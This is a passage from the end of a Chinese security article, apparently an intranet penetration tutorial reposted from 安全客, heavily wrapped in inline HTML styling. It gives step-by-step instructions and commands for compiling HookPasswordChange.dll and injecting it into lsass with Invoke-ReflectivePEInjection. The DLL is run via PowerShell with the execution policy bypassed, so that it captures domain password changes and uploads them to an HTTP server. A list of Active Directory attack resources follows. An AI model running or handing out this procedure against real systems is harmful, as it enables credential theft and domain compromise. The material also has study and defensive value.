-apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">poc下载地址：https：</span><br  /><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://github.com/clymb3r/Misc-Windows-Hacking</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">使用VS2015开发环境，MFC设置为在静态库中使用MFC</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">编译工程，生成HookPasswordChange.dll</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">下载PowerShell的的DLL注入脚本</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://github.com/clymb3r/PowerShell/blob/master/Invoke-ReflectivePEInjection/Invoke-ReflectivePEInjection.ps1</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">在代码尾部添加如下代码：</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs css" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">Invoke-ReflectivePEInjection</span> <span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">-PEPath</span> <span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">HookPasswordChange</span>.dll –<span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">procname</span> <span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">lsass</span></span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">并命名为HookPasswordChangeNotify.ps1</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">上传HookPasswordChangeNotify.ps1和HookPasswordChange.dll</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">管理员权限执行：</span></p><pre class="pure-highlightjs" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size:14px;line-height:34px;;margin-top: 0px;margin-bottom: 1rem;overflow: auto;color: rgb(33, 37, 41);background-color: rgb(255, 255, 255);"><code class="hljs css" style="font family: SFMono-Regular, Menlo, Monaco, Consolas, &quot;Liberation Mono&quot;, &quot;Courier New&quot;, monospace;font-size: inherit;color: rgb(51, 51, 51);display: block;overflow-x: auto;padding: 0.5em;background: rgb(248, 248, 248);"><span style="font-size:14px;line-height:34px;;"><span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">PowerShell</span>.exe <span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">-ExecutionPolicy</span> <span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">Bypass</span> <span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">-File</span> <span class="hljs-selector-tag" style="font-size:14px;line-height:34px;;font-weight: bold;">HookPasswordChangeNotify</span>.ps1</span></code></pre><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="top: auto;left: auto;margin: 12px 279px;right: auto;bottom: auto;font-size:14px;line-height:34px;;"><img class="aligncenter" data-ratio="0.6983333333333334" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/41_Q5lpAOwfVa8Q7G7EeFSTiaDPqonfHg.jpg" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_jpg/Uq8QfeuvouibDeoRUnFC7dcb7yfEpPIibVuJc0wSkz1o3pApsMc3MZlgDTBQ5lpAOwfVa8Q7G7EeFSTiaDPqonfHg/640?wx_fmt=jpeg'" data-type="jpeg" data-w="600" style="vertical-align: middle;border-style: none;display: block;margin: 0px;"  /></span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">将获取到的密码上传到HTTP服务器：</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">http://carnal0wnage.attackresearch.com/2013/09/stealing-passwords-every-time-they.html</span></p><p style="margin-bottom: 1rem;color: rgb(88, 88, 88);font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;font-size:16px;line-height:36px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="font-size:14px;line-height:34px;;">&nbsp;</span><strong style="letter-spacing: 0.544px;text-align: justify;color: rgb(51, 51, 51);font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;font-size:15px;line-height:35px;;"><span style="color: rgb(136, 136, 136);font family: &quot;Lucida Grande&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, Verdana, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, STHeiti, &quot;Microsoft YaHei&quot;, &quot;WenQuanYi Zen Hei&quot;, &quot;WenQuanYi Micro Hei&quot;, &quot;Noto Sans CJK SC&quot;, &quot;Source Han Sans CN&quot;, SimSun, sans-serif;white-space: pre-wrap;"><strong style="color: rgb(255, 104, 39);font family: -apple-system-font, BlinkMacSystemFont, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;letter-spacing: 0.544px;text-align: center;white-space: normal;"><img data-type="png" class="" data-ratio="0.109375" data-w="640" data-backw="501" data-backh="54" data-before-oversubscription-url="https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/42_rsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png'" style="letter-spacing: 0.544px;color: rgb(51, 51, 51);font-size:17px;line-height:37px;;text-align: justify;font family: -apple-system-font, system-ui, &quot;Helvetica Neue&quot;, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei UI&quot;, &quot;Microsoft YaHei&quot;, Arial, sans-serif;visibility: visible !important;width: 639.6px !important;"  /></strong></span></strong></p><h2 name="h2-28" style="margin-top: 12px;margin-bottom: 0.5rem;font family: Lato, &quot;Helvetica Neue For Number&quot;, -apple-system, BlinkMacSystemFont, &quot;Segoe UI&quot;, Roboto, &quot;PingFang SC&quot;, &quot;Hiragino Sans GB&quot;, &quot;Microsoft YaHei&quot;, &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;line-height: 2;color: rgba(0, 0, 0, 0.85);font-size:22px;line-height:42px;;white-space: normal;background-color: rgb(255, 255, 255);"><span style="vertical-align: inherit;font-size:14px;line-height:34px;;">其他补充</span><br  /></h2><ul style="" class=" list-paddingleft-2"><li><p><span style="font-size:14px;line-height:34px;;">Kerberos AD认证过程</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://adsecurity.org/?p=227</span></p></li><li><p><span style="font-size:14px;line-height:34px;;">Kerberos＆KRBTGT帐号介绍</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">http://adsecurity.org/?p=483</span></p></li><li><p><span style="font-size:14px;line-height:34px;;">lapsg理解</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://adsecurity.org/?p=1790</span></p></li><li><p><span style="font-size:14px;line-height:34px;;">Active Directory攻击和防御资源</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://adsecurity.org/?p=1681</span></p></li><li><p><span style="font-size:14px;line-height:34px;;">烂土豆 - 从服务帐户到系统的特权升级</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/</span></p></li><li><p><span style="font-size:14px;line-height:34px;;">Mimikatz非官方文档</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">https://adsecurity.org/?page_id=1821#SEKURLSALogonPasswords</span></p></li><li><p><span style="font-size:14px;line-height:34px;;">linux / UNIX / BSD的后期渗透思路</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">http://bit.ly/pqJxA5</span></p></li><li><p><span style="font-size:14px;line-height:34px;;">Metasploit的后期渗透思路</span></p></li><li><p><span style="font-size:14px;line-height:34px;;color: rgb(255, 104, 39);">http://bit.ly/JpJ1TR</span></p></li></ul><p style="text-align: center;"><br  /></p><p><span style="display: table-cell;vertical-align: middle;"><span style="vertical-align: middle;"></span></span></p><p style="text-align: right;"><span style="font-size:11px;line-height:31px;;color: rgb(136, 136, 136);">作者：mx7krshell</span></p><p style="text-align: right;"><span style="font-size:11px;line-height:31px;;color: rgb(136, 136, 136);">来源：安全客</span></p><p><span style="display: table-cell;vertical-align: middle;"><span style="vertical-align: middle;"></span></span></p><p><br  /></p><p style="text-align: center;"><img class="" data-copyright="0" data-ratio="0.3281027104136947" data-s="300,640" src="图片/HACK学习呀_2018-12-05_我所了解的内网渗透-内网渗透知识大总结/43_9kZ6Bzp6HKPIkCGYkfBsPynR63cBgg.png" onerror="this.src='https://mmbiz.qpic.cn/mmbiz_png/Uq8Qfeuvou85etJYTkncLGY4Biavb6ibNajxPOSFB9UFWD40tY4uCrHqy59kZ6Bzp6HKPIkCGYkfBsPynR63cBgg/640?wx_fmt=png'" data-type="png" data-w="701" style=""  /></p>
                <div class="msg_source_url"><a href="https://www.anquanke.com/post/id/92646">阅读原文</a></div></div>
</div>
</body>
</html>